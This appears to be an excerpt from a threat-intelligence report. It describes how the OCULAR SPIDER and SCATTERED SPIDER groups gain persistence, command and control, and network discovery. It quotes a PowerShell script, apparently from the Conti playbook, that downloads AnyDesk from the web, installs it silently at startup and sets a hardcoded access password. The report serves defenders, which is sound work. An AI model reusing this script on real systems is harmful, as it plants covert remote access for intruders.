[Ocular Spider] - 	
OCULAR SPIDER affiliates use remote desktop and remote monitoring and management (RMM) tools such as AnyDesk, AteraAgent, and Splashtop for persistence and C2 operations. In several incidents, OCULAR SPIDER affiliates used a PS script that appeared in WIZARD SPIDER’s Conti playbook to install AnyDesk (CSIT-25028):

Function AnyDesk {

   mkdir "C:\ProgramData\AnyDesk"

   # Download AnyDesk

   $clnt = new-object System.Net.WebClient

   $url = "http[:]//download.anydesk[.]com/AnyDesk.exe"

   $file = "C:\ProgramData\AnyDesk.exe"

   $clnt.DownloadFile($url,$file)

   cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent

   cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password

[...]

   cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id

}

[Scattered Spider] - The adversary heavily used ping to test connectivity to file-sharing sites and RMM tool-hosting sites. To employ System Network Configuration Discovery, a threat actor attempts to collect details about a network configuration and its settings. Multiple tools are available to help actors leverage this technique, including arp, ipconfig/ifconfig, ping, nltest, and route.

Threat actors commonly use multiple discovery techniques immediately following initial access and frequently employ additional discovery techniques during intrusions using LOLbins, including Security Software Discovery (T1018.001), Domain Trust Discovery (T1482) using nltest, System Information Discovery (T1082), System Owner/User Discovery (T1033), and Account Discovery (T1087).

SCATTERED SPIDER extensively uses the ping utility to test connectivity to various legitimate file- or RMM-hosting sites. In early 2023, the adversary accessed multiple North America-based technology companies that specialize in Business Process Outsourcing (BPO) and used the ping command to test connectivity to two different North America-based cellular providers.
Additionally, SCATTERED SPIDER used LOTL utilities, including ping and net, to discover information about network architecture and Active Directory (AD) information. SCATTERED SPIDER has employed this technique on both on-premise and Cloud environments.
